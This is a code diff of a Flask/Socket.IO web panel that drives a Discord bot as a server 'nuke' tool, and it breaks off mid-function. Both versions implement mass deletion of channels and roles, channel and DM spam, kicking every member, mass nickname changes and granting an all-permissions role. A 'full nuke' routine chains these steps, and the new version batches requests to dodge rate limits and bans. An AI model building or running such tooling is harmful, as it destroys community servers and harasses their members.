@@ -2,322 +2,37 @@ import sys
 import os
 sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))  # DON'T CHANGE THIS !!!
 
+import asyncio
+import json
+import base64
 from flask import Flask, render_template, request, jsonify, send_from_directory
 from flask_socketio import SocketIO, emit
 import discord
 from discord.ext import commands
-import asyncio
 import random
 import threading
 import time
-import json
-from werkzeug.utils import secure_filename
-import os
-import concurrent.futures
+from concurrent.futures import ThreadPoolExecutor
 
+# Initialize Flask app
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'discord_bot_controller_secret'
-app.config['UPLOAD_FOLDER'] = os.path.join(os.path.dirname(__file__), 'static', 'uploads')
-socketio = SocketIO(app, cors_allowed_origins="*")
-
-# Ensure upload directory exists
-os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
-
-# Get port from environment variable for Render compatibility
-port = int(os.environ.get("PORT", 8080))
+app.config['SECRET_KEY'] = 'your_secret_key'
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
 # Global variables
 bot_instances = {}
-current_bot = None
-current_guild = None
+current_tokens = {}
 
-# Discord bot class
-class DiscordBot:
-    def __init__(self, token):
-        self.token = token
-        self.bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
-        self.is_ready = False
-        self.guilds = []
-        
-        # Register events
-        @self.bot.event
-        async def on_ready():
-            self.is_ready = True
-            self.guilds = [{'id': guild.id, 'name': guild.name, 'memberCount': len(guild.members), 
-                           'icon': str(guild.icon.url) if guild.icon else None} for guild in self.bot.guilds]
-            print(f'Bot logged in as {self.bot.user.name}')
-    
-    async def start_bot(self):
-        try:
-            await self.bot.start(self.token)
-        except discord.errors.LoginFailure:
-            return False
-        except Exception as e:
-            print(f"Error starting bot: {e}")
-            return False
-        return True
-    
-    async def close(self):
-        if self.bot:
-            await self.bot.close()
-    
-    def get_guild(self, guild_id):
-        return self.bot.get_guild(int(guild_id))
-    
-    async def create_channels(self, guild, count, name, delete_old=False):
-        if delete_old:
-            for channel in guild.channels:
-                try:
-                    await channel.delete()
-                    yield {'progress': 0, 'message': f'Deleted channel: {channel.name}'}
-                except Exception as e:
-                    print(f"Error deleting channel: {e}")
-        
-        total = int(count)
-        for i in range(total):
-            try:
-                await guild.create_text_channel(f"{name}-{i+1}")
-                progress = int((i + 1) / total * 100)
-                yield {'progress': progress, 'message': f'Created channel {i+1}/{total}'}
-            except Exception as e:
-                print(f"Error creating channel: {e}")
-        
-        yield {'progress': 100, 'message': f'Created {total} channels'}
-    
-    async def create_roles(self, guild, count, name, delete_old=False):
-        if delete_old:
-            for role in guild.roles:
-                if role.name != "@everyone":
-                    try:
-                        await role.delete()
-                        yield {'progress': 0, 'message': f'Deleted role: {role.name}'}
-                    except Exception as e:
-                        print(f"Error deleting role: {e}")
-        
-        total = int(count)
-        for i in range(total):
-            try:
-                # Generate random color
-                color = discord.Color.from_rgb(
-                    random.randint(0, 255),
-                    random.randint(0, 255),
-                    random.randint(0, 255)
-                )
-                
-                # Create role with admin permissions if first role
-                if i == 0:
-                    await guild.create_role(name=f"{name}-{i+1}", color=color, permissions=discord.Permissions.all())
-                else:
-                    await guild.create_role(name=f"{name}-{i+1}", color=color)
-                
-                progress = int((i + 1) / total * 100)
-                yield {'progress': progress, 'message': f'Created role {i+1}/{total}'}
-            except Exception as e:
-                print(f"Error creating role: {e}")
-        
-        yield {'progress': 100, 'message': f'Created {total} roles'}
-    
-    async def spam_channels(self, guild, message, count):
-        channels = guild.text_channels
-        total_messages = len(channels) * int(count)
-        sent_count = 0
-        
-        for channel in channels:
-            for i in range(int(count)):
-                try:
-                    await channel.send(message)
-                    sent_count += 1
-                    progress = int(sent_count / total_messages * 100)
-                    yield {'progress': progress, 'message': f'Sent {sent_count}/{total_messages} messages'}
-                except Exception as e:
-                    print(f"Error sending message: {e}")
-        
-        yield {'progress': 100, 'message': f'Sent {sent_count} messages to {len(channels)} channels'}
-    
-    async def spam_dms(self, guild, message):
-        members = guild.members
-        total = len(members)
-        sent_count = 0
-        
-        for i, member in enumerate(members):
-            if not member.bot:
-                try:
-                    await member.send(message)
-                    sent_count += 1
-                except Exception as e:
-                    print(f"Error sending DM to {member.name}: {e}")
-            
-            progress = int((i + 1) / total * 100)
-            yield {'progress': progress, 'message': f'Sent DMs to {sent_count}/{total} members'}
-        
-        yield {'progress': 100, 'message': f'Sent DMs to {sent_count} members'}
-    
-    async def update_server(self, guild, name=None, icon=None):
-        try:
-            await guild.edit(name=name if name else guild.name, icon=icon if icon else guild.icon)
-            return True
-        except Exception as e:
-            print(f"Error updating server: {e}")
-            return False
-    
-    async def kick_all_members(self, guild):
-        members = guild.members
-        total = len(members)
-        kicked_count = 0
-        
-        for i, member in enumerate(members):
-            if not member.bot and member.id != guild.owner_id and member != self.bot.user:
-                try:
-                    await member.kick(reason="Mass kick requested")
-                    kicked_count += 1
-                except Exception as e:
-                    print(f"Error kicking {member.name}: {e}")
-            
-            progress = int((i + 1) / total * 100)
-            yield {'progress': progress, 'message': f'Kicked {kicked_count}/{total} members'}
-        
-        yield {'progress': 100, 'message': f'Kicked {kicked_count} members'}
-    
-    async def get_channels(self, guild):
-        return [{'id': channel.id, 'name': channel.name} for channel in guild.text_channels]
-    
-    async def get_roles(self, guild):
-        return [{'id': role.id, 'name': role.name, 'color': str(role.color)} for role in guild.roles if role.name != "@everyone"]
-    
-    async def get_server_info(self, guild):
-        return {
-            'name': guild.name,
-            'icon': str(guild.icon.url) if guild.icon else None,
-            'memberCount': len(guild.members)
-        }
-    
-    # Full nuke operation - execute all operations in parallel
-    async def execute_full_nuke(self, guild, params):
-        # Create tasks for all operations
-        tasks = []
-        results = {}
-        
-        # Add create channels task
-        if params.get('delete_old_rooms', True):
-            tasks.append(('create_channels', self.create_channels(
-                guild, 
-                params.get('room_count', 10), 
-                params.get('room_name', 'nuked'), 
-                True
-            )))
-        
-        # Add create roles task
-        if params.get('delete_old_roles', True):
-            tasks.append(('create_roles', self.create_roles(
-                guild, 
-                params.get('role_count', 10), 
-                params.get('role_name', 'nuked'), 
-                True
-            )))
-        
-        # Add update server task
-        if params.get('server_name'):
-            tasks.append(('update_server', self.update_server(
-                guild, 
-                name=params.get('server_name', 'NUKED SERVER')
-            )))
-        
-        # Execute initial tasks concurrently
-        for name, coro in tasks:
-            try:
-                if name == 'update_server':
-                    result = await coro
-                    results[name] = {'success': result}
-                else:
-                    async for progress in coro:
-                        results[name] = progress
-                        # Calculate overall progress
-                        overall_progress = self._calculate_overall_progress(results)
-                        yield {'overall_progress': overall_progress, 'message': f'Executing {name}: {progress["message"]}'}
-            except Exception as e:
-                print(f"Error in {name}: {e}")
-                results[name] = {'progress': 0, 'message': f'Error in {name}: {str(e)}'}
-        
-        # Now that channels are created, spam them
-        try:
-            async for progress in self.spam_channels(
-                guild, 
-                params.get('channel_spam_message', 'SERVER NUKED!'), 
-                params.get('message_count', 5)
-            ):
-                results['spam_channels'] = progress
-                overall_progress = self._calculate_overall_progress(results)
-                yield {'overall_progress': overall_progress, 'message': f'Spamming channels: {progress["message"]}'}
-        except Exception as e:
-            print(f"Error in spam_channels: {e}")
-            results['spam_channels'] = {'progress': 0, 'message': f'Error in spam_channels: {str(e)}'}
-        
-        # Spam DMs
-        try:
-            async for progress in self.spam_dms(
-                guild, 
-                params.get('dm_spam_message', 'SERVER NUKED!')
-            ):
-                results['spam_dms'] = progress
-                overall_progress = self._calculate_overall_progress(results)
-                yield {'overall_progress': overall_progress, 'message': f'Spamming DMs: {progress["message"]}'}
-        except Exception as e:
-            print(f"Error in spam_dms: {e}")
-            results['spam_dms'] = {'progress': 0, 'message': f'Error in spam_dms: {str(e)}'}
-        
-        # Finally, kick all members if requested
-        if params.get('kick_all', True):
-            try:
-                async for progress in self.kick_all_members(guild):
-                    results['kick_all'] = progress
-                    overall_progress = self._calculate_overall_progress(results)
-                    yield {'overall_progress': overall_progress, 'message': f'Kicking members: {progress["message"]}'}
-            except Exception as e:
-                print(f"Error in kick_all_members: {e}")
-                results['kick_all'] = {'progress': 0, 'message': f'Error in kick_all_members: {str(e)}'}
-        
-        # Return final progress
-        yield {'overall_progress': 100, 'message': 'Full nuke completed successfully!'}
-    
-    def _calculate_overall_progress(self, results):
-        # Define weights for different operations
-        weights = {
-            'create_channels': 0.2,
-            'create_roles': 0.2,
-            'update_server': 0.1,
-            'spam_channels': 0.2,
-            'spam_dms': 0.15,
-            'kick_all': 0.15
-        }
-        
-        total_progress = 0
-        total_weight = 0
-        
-        for operation, result in results.items():
-            if operation in weights:
-                weight = weights[operation]
-                if operation == 'update_server':
-                    progress = 100 if result.get('success', False) else 0
-                else:
-                    progress = result.get('progress', 0)
-                
-                total_progress += progress * weight
-                total_weight += weight
-        
-        if total_weight == 0:
-            return 0
-        
-        return int(total_progress / total_weight)
-
-# Routes
+# Serve static files
 @app.route('/')
 def index():
     return send_from_directory('static', 'index.html')
 
 @app.route('/<path:path>')
-def serve_static(path):
+def static_files(path):
     return send_from_directory('static', path)
 
+# Handle avatar upload
 @app.route('/upload_avatar', methods=['POST'])
 def upload_avatar():
     if 'avatar' not in request.files:
@@ -327,334 +42,896 @@ def upload_avatar():
     if file.filename == '':
         return jsonify({'success': False, 'message': 'No selected file'})
     
-    if file:
-        filename = secure_filename(file.filename)
-        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-        file.save(filepath)
+    try:
+        # Read file as bytes
+        file_data = file.read()
+        
+        # Get session ID
+        sid = request.sid if hasattr(request, 'sid') else None
+        if not sid:
+            for key in request.cookies:
+                if key.startswith('io='):
+                    sid = key[3:]
+                    break
+        
+        if not sid or sid not in current_tokens:
+            return jsonify({'success': False, 'message': 'Session not found'})
+        
+        # Get bot instance
+        bot = bot_instances.get(sid)
+        if not bot:
+            return jsonify({'success': False, 'message': 'Bot not found'})
         
         # Update server icon
-        if current_bot and current_guild:
-            with open(filepath, 'rb') as image:
-                icon_bytes = image.read()
-                
-                async def update_icon():
-                    guild = current_bot.get_guild(current_guild)
-                    if guild:
-                        await current_bot.update_server(guild, icon=icon_bytes)
-                
-                asyncio.run_coroutine_threadsafe(update_icon(), bot_loop)
+        server_id = bot.current_server_id
+        if not server_id:
+            return jsonify({'success': False, 'message': 'No server selected'})
         
-        return jsonify({'success': True, 'filepath': filepath})
-    
-    return jsonify({'success': False, 'message': 'Failed to upload file'})
+        # Convert to base64 for discord.py
+        server = bot.get_guild(int(server_id))
+        if not server:
+            return jsonify({'success': False, 'message': 'Server not found'})
+        
+        # Run in a separate thread to avoid blocking
+        def update_icon():
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(server.edit(icon=file_data))
+            loop.close()
+        
+        threading.Thread(target=update_icon).start()
+        
+        return jsonify({'success': True})
+    except Exception as e:
+        print(f"Error uploading avatar: {e}")
+        return jsonify({'success': False, 'message': str(e)})
 
-# Socket.IO events
+# Discord Bot Class
+class DiscordBot(commands.Bot):
+    def __init__(self, token, sid):
+        intents = discord.Intents.all()
+        super().__init__(command_prefix='!', intents=intents)
+        self.token = token
+        self.sid = sid
+        self.current_server_id = None
+        self.is_ready = False
+        self.loop = asyncio.new_event_loop()
+        self.thread_pool = ThreadPoolExecutor(max_workers=10)
+    
+    async def on_ready(self):
+        print(f'Logged in as {self.user.name}')
+        self.is_ready = True
+        
+        # Get servers
+        servers = []
+        for guild in self.guilds:
+            icon_url = str(guild.icon.url) if guild.icon else None
+            servers.append({
+                'id': str(guild.id),
+                'name': guild.name,
+                'memberCount': len(guild.members),
+                'icon': icon_url
+            })
+        
+        # Emit to client
+        socketio.emit('auth_success', {'servers': servers}, room=self.sid)
+    
+    def run_bot(self):
+        asyncio.set_event_loop(self.loop)
+        self.loop.run_until_complete(self.start(self.token))
+    
+    def stop_bot(self):
+        self.loop.run_until_complete(self.close())
+        self.loop.close()
+    
+    # Server operations
+    async def get_server_info(self, server_id):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return None
+        
+        return {
+            'id': str(guild.id),
+            'name': guild.name,
+            'memberCount': len(guild.members),
+            'icon': str(guild.icon.url) if guild.icon else None
+        }
+    
+    async def get_rooms(self, server_id):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return []
+        
+        rooms = []
+        for channel in guild.text_channels:
+            rooms.append({
+                'id': str(channel.id),
+                'name': channel.name
+            })
+        
+        return rooms
+    
+    async def get_roles(self, server_id):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return []
+        
+        roles = []
+        for role in guild.roles:
+            if role.name != '@everyone':
+                roles.append({
+                    'id': str(role.id),
+                    'name': role.name,
+                    'color': str(role.color)
+                })
+        
+        return roles
+    
+    # Nuke operations - with asyncio for concurrency
+    async def create_rooms(self, server_id, count, name, delete_old=False):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return False
+        
+        try:
+            # Delete old channels if requested
+            if delete_old:
+                delete_tasks = []
+                for channel in guild.channels:
+                    delete_tasks.append(channel.delete())
+                
+                if delete_tasks:
+                    await asyncio.gather(*delete_tasks)
+                    await asyncio.sleep(1)  # Small delay to ensure deletion completes
+            
+            # Create new channels concurrently
+            create_tasks = []
+            for i in range(int(count)):
+                channel_name = f"{name}-{i+1}" if count > 1 else name
+                create_tasks.append(guild.create_text_channel(channel_name))
+            
+            await asyncio.gather(*create_tasks)
+            return True
+        except Exception as e:
+            print(f"Error creating rooms: {e}")
+            return False
+    
+    async def delete_room(self, server_id, room_id):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return False
+        
+        channel = guild.get_channel(int(room_id))
+        if not channel:
+            return False
+        
+        try:
+            await channel.delete()
+            return True
+        except Exception as e:
+            print(f"Error deleting room: {e}")
+            return False
+    
+    async def create_roles(self, server_id, count, name, delete_old=False):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return False
+        
+        try:
+            # Delete old roles if requested
+            if delete_old:
+                delete_tasks = []
+                for role in guild.roles:
+                    if role.name != '@everyone':
+                        delete_tasks.append(role.delete())
+                
+                if delete_tasks:
+                    await asyncio.gather(*delete_tasks)
+                    await asyncio.sleep(1)  # Small delay to ensure deletion completes
+            
+            # Create new roles concurrently
+            create_tasks = []
+            for i in range(int(count)):
+                role_name = f"{name}-{i+1}" if count > 1 else name
+                # First role is admin
+                if i == 0:
+                    create_tasks.append(guild.create_role(
+                        name=role_name,
+                        color=discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)),
+                        permissions=discord.Permissions.all()
+                    ))
+                else:
+                    create_tasks.append(guild.create_role(
+                        name=role_name,
+                        color=discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
+                    ))
+            
+            await asyncio.gather(*create_tasks)
+            return True
+        except Exception as e:
+            print(f"Error creating roles: {e}")
+            return False
+    
+    async def delete_role(self, server_id, role_id):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return False
+        
+        role = guild.get_role(int(role_id))
+        if not role:
+            return False
+        
+        try:
+            await role.delete()
+            return True
+        except Exception as e:
+            print(f"Error deleting role: {e}")
+            return False
+    
+    async def spam_channels(self, server_id, message, count):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return False
+        
+        try:
+            spam_tasks = []
+            for channel in guild.text_channels:
+                for _ in range(int(count)):
+                    spam_tasks.append(channel.send(message))
+            
+            # Execute in batches to avoid rate limits
+            batch_size = 10
+            for i in range(0, len(spam_tasks), batch_size):
+                batch = spam_tasks[i:i+batch_size]
+                await asyncio.gather(*batch)
+                await asyncio.sleep(0.5)  # Small delay between batches
+            
+            return True
+        except Exception as e:
+            print(f"Error spamming channels: {e}")
+            return False
+    
+    async def spam_dms(self, server_id, message):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return False
+        
+        try:
+            dm_tasks = []
+            for member in guild.members:
+                if not member.bot and member.id != self.user.id:
+                    dm_tasks.append(member.send(message))
+            
+            # Execute in batches to avoid rate limits
+            batch_size = 5
+            for i in range(0, len(dm_tasks), batch_size):
+                batch = dm_tasks[i:i+batch_size]
+                try:
+                    await asyncio.gather(*batch)
+                    await asyncio.sleep(1)  # Larger delay for DMs to avoid bans
+                except:
+                    pass  # Continue even if some DMs fail
+            
+            return True
+        except Exception as e:
+            print(f"Error spamming DMs: {e}")
+            return False
+    
+    async def update_server(self, server_id, name):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return False
+        
+        try:
+            await guild.edit(name=name)
+            return True
+        except Exception as e:
+            print(f"Error updating server: {e}")
+            return False
+    
+    async def kick_all_members(self, server_id):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return False
+        
+        try:
+            kick_tasks = []
+            for member in guild.members:
+                if not member.bot and member.id != self.user.id and guild.me.top_role > member.top_role:
+                    kick_tasks.append(member.kick(reason="Mass kick"))
+            
+            # Execute in batches to avoid rate limits
+            batch_size = 5
+            for i in range(0, len(kick_tasks), batch_size):
+                batch = kick_tasks[i:i+batch_size]
+                try:
+                    await asyncio.gather(*batch)
+                    await asyncio.sleep(1)  # Delay between batches
+                except:
+                    pass  # Continue even if some kicks fail
+            
+            return True
+        except Exception as e:
+            print(f"Error kicking members: {e}")
+            return False
+    
+    async def change_all_nicknames(self, server_id, nickname):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return False
+        
+        try:
+            nickname_tasks = []
+            for member in guild.members:
+                if not member.bot and member.id != self.user.id and guild.me.top_role > member.top_role:
+                    nickname_tasks.append(member.edit(nick=nickname))
+            
+            # Execute in batches to avoid rate limits
+            batch_size = 5
+            for i in range(0, len(nickname_tasks), batch_size):
+                batch = nickname_tasks[i:i+batch_size]
+                try:
+                    await asyncio.gather(*batch)
+                    await asyncio.sleep(1)  # Delay between batches
+                except:
+                    pass  # Continue even if some edits fail
+            
+            return True
+        except Exception as e:
+            print(f"Error changing nicknames: {e}")
+            return False
+    
+    # Full nuke operation - execute all operations in parallel
+    async def execute_full_nuke(self, server_id, options):
+        guild = self.get_guild(int(server_id))
+        if not guild:
+            return False
+        
+        try:
+            # Prepare all tasks based on options
+            tasks = []
+            
+            # Rooms tasks
+            if options.get('create_rooms', False):
+                tasks.append(self.create_rooms(
+                    server_id,
+                    options.get('room_count', 10),
+                    options.get('room_name', 'nuked'),
+                    options.get('delete_old_rooms', False)
+                ))
+            
+            # Roles tasks
+            if options.get('create_roles', False):
+                tasks.append(self.create_roles(
+                    server_id,
+                    options.get('role_count', 10),
+                    options.get('role_name', 'nuked'),
+                    options.get('delete_old_roles', False)
+                ))
+            
+            # Server settings tasks
+            if options.get('update_server', False):
+                tasks.append(self.update_server(
+                    server_id,
+                    options.get('server_name', 'NUKED SERVER')
+                ))
+            
+            # Execute initial tasks concurrently
+            await asyncio.gather(*tasks)
+            
+            # Second wave of tasks that depend on the first wave
+            tasks2 = []
+            
+            # Spam tasks
+            if options.get('spam_channels', False):
+                tasks2.append(self.spam_channels(
+                    server_id,
+                    options.get('channel_spam_message', 'SERVER NUKED!'),
+                    options.get('message_count', 5)
+                ))
+            
+            if options.get('spam_dms', False):
+                tasks2.append(self.spam_dms(
+                    server_id,
+                    options.get('dm_spam_message', 'SERVER NUKED!')
+                ))
+            
+            # Nickname tasks
+            if options.get('change_nicknames', False):
+                tasks2.append(self.change_all_nicknames(
+                    server_id,
+                    options.get('nickname', 'nuked')
+                ))
+            
+            # Execute second wave concurrently
+            await asyncio.gather(*tasks2)
+            
+            # Final wave - kick all members (if requested)
+            if options.get('kick_all', False):
+                await self.kick_all_members(server_id)
+            
+            return True
+        except Exception as e:
+            print(f"Error executing full nuke: {e}")
+            return False
+
+# Socket.io events
 @socketio.on('connect')
 def handle_connect():
-    print('Client connected')
+    print(f'Client connected: {request.sid}')
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    print('Client disconnected')
+    print(f'Client disconnected: {request.sid}')
+    
+    # Clean up bot instance if exists
+    if request.sid in bot_instances:
+        bot = bot_instances[request.sid]
+        try:
+            bot.stop_bot()
+        except:
+            pass
+        del bot_instances[request.sid]
+    
+    if request.sid in current_tokens:
+        del current_tokens[request.sid]
 
 @socketio.on('authenticate')
 def handle_authenticate(data):
-    global current_bot
     token = data.get('token')
-    
     if not token:
         emit('auth_error', {'message': 'No token provided'})
         return
     
-    # Check if bot already exists
-    if token in bot_instances:
-        current_bot = bot_instances[token]
-        if current_bot.is_ready:
-            emit('auth_success', {'servers': current_bot.guilds})
-            return
+    # Clean up existing bot instance if any
+    if request.sid in bot_instances:
+        bot = bot_instances[request.sid]
+        try:
+            bot.stop_bot()
+        except:
+            pass
+        del bot_instances[request.sid]
     
     # Create new bot instance
-    bot = DiscordBot(token)
+    bot = DiscordBot(token, request.sid)
+    bot_instances[request.sid] = bot
+    current_tokens[request.sid] = token
     
     # Start bot in a separate thread
-    def start_bot_thread():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        global bot_loop
-        bot_loop = loop
-        
-        try:
-            loop.run_until_complete(bot.start_bot())
-        except Exception as e:
-            print(f"Error in bot thread: {e}")
-            emit('auth_error', {'message': str(e)})
-    
-    bot_thread = threading.Thread(target=start_bot_thread)
-    bot_thread.daemon = True
-    bot_thread.start()
-    
-    # Wait for bot to be ready
-    timeout = 30  # seconds
-    start_time = time.time()
-    while not bot.is_ready and time.time() - start_time < timeout:
-        time.sleep(0.5)
-    
-    if bot.is_ready:
-        bot_instances[token] = bot
-        current_bot = bot
-        emit('auth_success', {'servers': bot.guilds})
-    else:
-        emit('auth_error', {'message': 'Failed to connect to Discord. Please check your token.'})
-
-@socketio.on('logout')
-def handle_logout():
-    global current_bot, current_guild
-    current_bot = None
-    current_guild = None
+    threading.Thread(target=bot.run_bot).start()
 
 @socketio.on('select_server')
 def handle_select_server(data):
-    global current_guild
     server_id = data.get('server_id')
-    
-    if not current_bot:
-        emit('operation_error', {'message': 'Not authenticated'})
+    if not server_id:
+        emit('operation_error', {'message': 'No server ID provided'})
         return
     
-    guild = current_bot.get_guild(server_id)
-    if guild:
-        current_guild = server_id
-        emit('server_selected', {'server_name': guild.name})
-    else:
-        emit('operation_error', {'message': 'Server not found'})
-
-@socketio.on('get_rooms')
-def handle_get_rooms():
-    if not current_bot or not current_guild:
-        emit('operation_error', {'message': 'No server selected'})
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
         return
     
-    async def get_channels():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            channels = await current_bot.get_channels(guild)
-            emit('rooms_list', {'rooms': channels})
+    bot = bot_instances[request.sid]
+    bot.current_server_id = server_id
     
-    asyncio.run_coroutine_threadsafe(get_channels(), bot_loop)
-
-@socketio.on('get_roles')
-def handle_get_roles():
-    if not current_bot or not current_guild:
-        emit('operation_error', {'message': 'No server selected'})
-        return
-    
-    async def get_roles():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            roles = await current_bot.get_roles(guild)
-            emit('roles_list', {'roles': roles})
-    
-    asyncio.run_coroutine_threadsafe(get_roles(), bot_loop)
+    emit('server_selected', {'server_id': server_id, 'server_name': 'Loading...'})
 
 @socketio.on('get_server_info')
 def handle_get_server_info():
-    if not current_bot or not current_guild:
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
         emit('operation_error', {'message': 'No server selected'})
         return
     
-    async def get_info():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            info = await current_bot.get_server_info(guild)
-            emit('server_info', info)
+    # Run in a separate thread
+    def get_info():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        server_info = loop.run_until_complete(bot.get_server_info(bot.current_server_id))
+        loop.close()
+        
+        if server_info:
+            socketio.emit('server_info', server_info, room=request.sid)
+        else:
+            socketio.emit('operation_error', {'message': 'Failed to get server info'}, room=request.sid)
     
-    asyncio.run_coroutine_threadsafe(get_info(), bot_loop)
+    threading.Thread(target=get_info).start()
+
+@socketio.on('get_rooms')
+def handle_get_rooms():
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
+        emit('operation_error', {'message': 'No server selected'})
+        return
+    
+    # Run in a separate thread
+    def get_rooms():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        rooms = loop.run_until_complete(bot.get_rooms(bot.current_server_id))
+        loop.close()
+        
+        socketio.emit('rooms_list', {'rooms': rooms}, room=request.sid)
+    
+    threading.Thread(target=get_rooms).start()
+
+@socketio.on('get_roles')
+def handle_get_roles():
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
+        emit('operation_error', {'message': 'No server selected'})
+        return
+    
+    # Run in a separate thread
+    def get_roles():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        roles = loop.run_until_complete(bot.get_roles(bot.current_server_id))
+        loop.close()
+        
+        socketio.emit('roles_list', {'roles': roles}, room=request.sid)
+    
+    threading.Thread(target=get_roles).start()
 
 @socketio.on('create_rooms')
 def handle_create_rooms(data):
-    if not current_bot or not current_guild:
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
         emit('operation_error', {'message': 'No server selected'})
         return
     
-    count = data.get('count', 10)
+    count = data.get('count', 1)
     name = data.get('name', 'new-channel')
     delete_old = data.get('delete_old', False)
     
-    async def create_channels_task():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            async for progress_data in current_bot.create_channels(guild, count, name, delete_old):
-                emit('operation_progress', progress_data)
-            
-            channels = await current_bot.get_channels(guild)
-            emit('rooms_list', {'rooms': channels})
-            emit('operation_complete', {'message': f'Created {count} channels'})
+    # Run in a separate thread
+    def create_rooms():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        # Send progress updates
+        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء إنشاء الرومات...'}, room=request.sid)
+        
+        success = loop.run_until_complete(bot.create_rooms(bot.current_server_id, count, name, delete_old))
+        loop.close()
+        
+        if success:
+            socketio.emit('operation_complete', {'message': 'تم إنشاء الرومات بنجاح'}, room=request.sid)
+            # Refresh rooms list
+            handle_get_rooms()
+        else:
+            socketio.emit('operation_error', {'message': 'فشل في إنشاء الرومات'}, room=request.sid)
     
-    asyncio.run_coroutine_threadsafe(create_channels_task(), bot_loop)
+    threading.Thread(target=create_rooms).start()
 
 @socketio.on('delete_room')
 def handle_delete_room(data):
-    if not current_bot or not current_guild:
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
         emit('operation_error', {'message': 'No server selected'})
         return
     
     room_id = data.get('room_id')
+    if not room_id:
+        emit('operation_error', {'message': 'No room ID provided'})
+        return
     
-    async def delete_room_task():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            channel = guild.get_channel(int(room_id))
-            if channel:
-                await channel.delete()
-                channels = await current_bot.get_channels(guild)
-                emit('rooms_list', {'rooms': channels})
-                emit('operation_complete', {'message': f'Deleted channel {channel.name}'})
-            else:
-                emit('operation_error', {'message': 'Channel not found'})
+    # Run in a separate thread
+    def delete_room():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        success = loop.run_until_complete(bot.delete_room(bot.current_server_id, room_id))
+        loop.close()
+        
+        if success:
+            socketio.emit('operation_complete', {'message': 'تم حذف الروم بنجاح'}, room=request.sid)
+            # Refresh rooms list
+            handle_get_rooms()
+        else:
+            socketio.emit('operation_error', {'message': 'فشل في حذف الروم'}, room=request.sid)
     
-    asyncio.run_coroutine_threadsafe(delete_room_task(), bot_loop)
+    threading.Thread(target=delete_room).start()
 
 @socketio.on('create_roles')
 def handle_create_roles(data):
-    if not current_bot or not current_guild:
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
         emit('operation_error', {'message': 'No server selected'})
         return
     
-    count = data.get('count', 10)
+    count = data.get('count', 1)
     name = data.get('name', 'new-role')
     delete_old = data.get('delete_old', False)
     
-    async def create_roles_task():
-        guild = current_bot.get_guild(current_guild)
-        if guild:
-            async for progress_data in current_bot.create_roles(guild, count, name, delete_old):
-                emit('operation_progress', progress_data)
-            
-            roles = await current_bot.get_roles(guild)
-            emit('roles_list', {'roles': roles})
-            emit('operation_complete', {'message': f'Created {count} roles'})
+    # Run in a separate thread
+    def create_roles():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        # Send progress updates
+        socketio.emit('operation_progress', {'progress': 10, 'message': 'بدء إنشاء الرولات...'}, room=request.sid)
+        
+        success = loop.run_until_complete(bot.create_roles(bot.current_server_id, count, name, delete_old))
+        loop.close()
+        
+        if success:
+            socketio.emit('operation_complete', {'message': 'تم إنشاء الرولات بنجاح'}, room=request.sid)
+            # Refresh roles list
+            handle_get_roles()
+        else:
+            socketio.emit('operation_error', {'message': 'فشل في إنشاء الرولات'}, room=request.sid)
     
-    asyncio.run_coroutine_threadsafe(create_roles_task(), bot_loop)
+    threading.Thread(target=create_roles).start()
 
 @socketio.on('delete_role')
 def handle_delete_role(data):
-    if not current_bot or not current_guild:
+    if request.sid not in bot_instances:
+        emit('auth_error', {'message': 'Not authenticated'})
+        return
+    
+    bot = bot_instances[request.sid]
+    if not bot.current_server_id:
         emit('operation_error', {'message': 'No server selected'})
         return
     
     role_id = data.get('role_id')
+    if not role_id:
